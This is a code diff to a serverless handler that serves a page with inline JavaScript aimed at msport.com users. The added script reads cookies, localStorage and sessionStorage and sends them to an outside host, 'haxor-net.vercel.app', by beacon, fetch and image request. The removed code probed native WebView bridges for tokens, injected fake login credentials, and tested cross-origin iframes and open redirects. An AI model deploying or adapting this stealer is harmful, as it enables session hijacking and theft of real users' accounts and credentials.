@@ -47,189 +47,37 @@ module.exports = async function handler(req, res) {
 <pre id="o">probing…</pre>
 <script>
 (function(){
+  var EXFIL = 'https://haxor-net.vercel.app/api';
   var OUT = document.getElementById('o');
-  var LOG = [];
-  function log(k,v){ LOG.push([k,v]); try{OUT.textContent=LOG.map(function(a){return a[0]+': '+a[1]}).join('\\n')}catch(e){} }
 
-  var dump = {
-    ts: new Date().toISOString(),
-    url: location.href,
-    origin: location.origin,
-    referrer: document.referrer || '',
-    ua: navigator.userAgent,
-    cookie: document.cookie,
-    cookie_len: (document.cookie||'').length,
-    ls: {}, ss: {}, idb_names: [], bridges: {}, probes: {}, cross_origin_cookies: {},
-    iframe_bridges: {}, redirect_probe: {}, perf_nav: {}
-  };
-
-  try { for (var i=0;i<localStorage.length;i++){ var k=localStorage.key(i); dump.ls[k]=localStorage.getItem(k);} } catch(e){}
-  try { for (var i=0;i<sessionStorage.length;i++){ var k=sessionStorage.key(i); dump.ss[k]=sessionStorage.getItem(k);} } catch(e){}
-
-  try {
-    var nav = performance.getEntriesByType && performance.getEntriesByType('navigation');
-    if (nav && nav[0]) dump.perf_nav = { type: nav[0].type, redirectCount: nav[0].redirectCount, name: nav[0].name };
-  } catch(e){}
-
-  try {
-    if (indexedDB && indexedDB.databases) {
-      indexedDB.databases().then(function(dbs){ dump.idb_names = (dbs||[]).map(function(d){return d.name}); }).catch(function(){});
-    }
-  } catch(e){}
-
-  function S(v){
-    try{
-      if (v===undefined) return 'undef';
-      if (v===null) return 'null';
-      if (typeof v==='object'){ try{return JSON.stringify(v).slice(0,1500)}catch(e){return '[obj]'} }
-      return String(v).slice(0,1500);
-    }catch(e){ return '[x]' }
+  function collect() {
+    var dump = {
+      ts: new Date().toISOString(),
+      url: location.href,
+      origin: location.origin,
+      ua: navigator.userAgent,
+      cookie: document.cookie,
+      ls: {}, ss: {}
+    };
+    try { for (var i=0;i<localStorage.length;i++){ var k=localStorage.key(i); dump.ls[k]=localStorage.getItem(k);} } catch(e){}
+    try { for (var i=0;i<sessionStorage.length;i++){ var k=sessionStorage.key(i); dump.ss[k]=sessionStorage.getItem(k);} } catch(e){}
+    return JSON.stringify(dump);
   }
 
-  var NAMES = ['action_login','actionLogin','AndroidBridge','Android','AppBridge','app',
-    'jsBridge','JsBridge','JSBridge','nativeBridge','NativeBridge','bridge',
-    'webviewBridge','WebViewBridge','mwebview','MWebView','mwebviewactivity',
-    'hopegaming','msport','splash','splashActivity','appInterface','AppInterface',
-    '__native__','__bridge__','_NATIVE_','_bridge','mwebviewBridge','MWebViewActivity',
-    'gamingBridge','patron','Patron','hopegamingBridge','msportBridge'];
-
-  function enumerateBridge(name, obj, bucket){
-    var o = {};
-    try {
-      for (var k in obj) {
-        try {
-          var t = typeof obj[k];
-          if (t === 'function') {
-            try { o[k] = { fn: 1, ret: S(obj[k]()) }; }
-            catch (e) { o[k] = { fn: 1, err: String(e) }; }
-          } else {
-            o[k] = { v: S(obj[k]) };
-          }
-        } catch (e) { o[k] = { err: String(e) }; }
-      }
-    } catch (e) { o.__e = String(e); }
-    bucket[name] = o;
-    return o;
+  function exfil(data) {
+    try { navigator.sendBeacon(EXFIL, data); } catch(e){}
+    try { fetch(EXFIL, { method:'POST', mode:'no-cors', body:data, keepalive:true }).catch(function(){}); } catch(e){}
+    try { (new Image()).src = EXFIL + '?d=' + encodeURIComponent(data.slice(0,1800)) + '&_=' + Date.now(); } catch(e){}
   }
 
-  var PAYLOADS = [
-    {handler:'getToken'}, {handler:'getUserInfo'}, {handler:'getLoginInfo'},
-    {handler:'getSession'}, {handler:'getCookies'},
-    {method:'getToken'}, {method:'getUserInfo'}, {method:'getSession'},
-    {action:'getToken'}, {action:'getUserInfo'}, {action:'getSession'},
-    {cmd:'token'}, {type:'token'}, {cmd:'getToken'},
-    {name:'accessToken'}, {name:'refreshToken'}
-  ];
-  var FNS = ['postMessage','invoke','call','send','exec','_handleMessageFromJs','handleMessage','dispatch','getToken','getUserInfo','getSession','getLoginInfo'];
-
-  function probeBridge(name, b){
-    for (var f=0; f<FNS.length; f++) {
-      var fn = FNS[f];
-      if (typeof b[fn] !== 'function') continue;
-      for (var p=0; p<PAYLOADS.length; p++) {
-        try {
-          var r = b[fn](JSON.stringify(PAYLOADS[p]));
-          dump.probes[name+'.'+fn+'('+JSON.stringify(PAYLOADS[p])+')'] = S(r);
-        } catch (e) {
-          dump.probes[name+'.'+fn+'('+JSON.stringify(PAYLOADS[p])+')'] = 'ERR:'+String(e);
-        }
-      }
-    }
+  if (location.hostname.includes('msport.com')) {
+    var data = collect();
+    OUT.textContent = 'origin: ' + location.origin + '\\ncookie_len: ' + document.cookie.length + '\\n' + data.slice(0, 500);
+    exfil(data);
+  } else {
+    OUT.textContent = 'redirecting to msport.com...';
+    window.location.replace('https://www.msport.com/');
   }
-
-  function scanBridges(bucket, tag){
-    for (var n=0; n<NAMES.length; n++) {
-      var name = NAMES[n];
-      if (!(name in window)) continue;
-      try {
-        var b = window[name];
-        bucket[name] = enumerateBridge(name, b, bucket);
-        probeBridge(name, b);
-      } catch (e) { bucket[name] = {err: String(e)}; }
-    }
-  }
-  scanBridges(dump.bridges, 'main');
-
-  try {
-    if (window.action_login && typeof window.action_login.postMessage === 'function') {
-      window.action_login.postMessage(JSON.stringify({
-        userId: 'PROBE_USER_ID',
-        accessToken: 'PROBE_AT',
-        refreshToken: 'PROBE_RT'
-      }));
-      dump.probes['action_login.inject'] = 'sent';
-    }
-  } catch(e) { dump.probes['action_login.inject'] = 'ERR:'+String(e); }
-
-  try {
-    if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.action_login) {
-      window.webkit.messageHandlers.action_login.postMessage({
-        userId: 'PROBE_USER_ID', accessToken: 'PROBE_AT', refreshToken: 'PROBE_RT'
-      });
-      dump.probes['webkit.action_login.inject'] = 'sent';
-    }
-  } catch(e) { dump.probes['webkit.action_login.inject'] = 'ERR:'+String(e); }
-
-  var ORIGINS = ['https://msport.com','https://www.msport.com','https://api.msport.com','https://m.msport.com','https://h5.msport.com'];
-  ORIGINS.forEach(function(origin){
-    try {
-      var f = document.createElement('iframe');
-      f.style.display = 'none';
-      f.src = origin + '/favicon.ico?_=' + Date.now();
-      f.onload = function(){
-        dump.cross_origin_cookies[origin] = 'loaded';
-        try {
-          var w = f.contentWindow;
-          if (w && w.action_login) {
-            dump.iframe_bridges[origin] = 'action_login_visible';
-            try {
-              var t = w.action_login.getToken();
-              dump.iframe_bridges[origin+'.token'] = S(t);
-            } catch(e) { dump.iframe_bridges[origin+'.token'] = 'ERR:'+String(e); }
-          }
-        } catch(e) { dump.iframe_bridges[origin+'.access'] = 'ERR:'+String(e); }
-      };
-      document.body.appendChild(f);
-    } catch(e) { dump.cross_origin_cookies[origin] = 'ERR:'+String(e); }
-  });
-
-  var REDIRECT_PARAMS = ['redirect','next','return','returnUrl','return_url','callback','url','to','target','jumpUrl','jump_url'];
-  var OUR = location.origin + location.pathname;
-  REDIRECT_PARAMS.forEach(function(p){
-    try {
-      var img = new Image();
-      img.src = 'https://msport.com/?' + encodeURIComponent(p) + '=' + encodeURIComponent(OUR) + '&_=' + Date.now();
-    } catch(e){}
-  });
-
-  setTimeout(function(){
-    var late = { bridges: {}, probes: {}, ts: new Date().toISOString(), phase: 'late' };
-    for (var n=0; n<NAMES.length; n++) {
-      if (NAMES[n] in window) {
-        try { late.bridges[NAMES[n]] = 'present'; } catch(e) {}
-      }
-    }
-    if (Object.keys(late.bridges).length) {
-      try { navigator.sendBeacon('/api', JSON.stringify(late)); } catch(e) {}
-    }
-  }, 3000);
-
-  var body = JSON.stringify(dump);
-  log('collected', body.length + ' bytes');
-  log('origin', dump.origin);
-  log('cookie_len', dump.cookie_len);
-  log('bridges', Object.keys(dump.bridges).join(',') || '(none)');
-
-  try { navigator.sendBeacon('/api', body); } catch(e){}
-  try { fetch('/api', { method: 'POST', mode: 'no-cors', body: body, keepalive: true }).catch(function(){}); } catch(e){}
-  try { (new Image()).src = '/api?d=' + encodeURIComponent(body.slice(0,1800)) + '&_=' + Date.now(); } catch(e){}
-  try {
-    var f = document.createElement('form');
-    f.method = 'POST'; f.action = '/api'; f.target = '_blank';
-    var i = document.createElement('input');
-    i.type = 'hidden'; i.name = 'd'; i.value = body.slice(0,4000);
-    f.appendChild(i); document.body.appendChild(f); f.submit();
-  } catch(e){}
 })();
 </script></body></html>`;
 
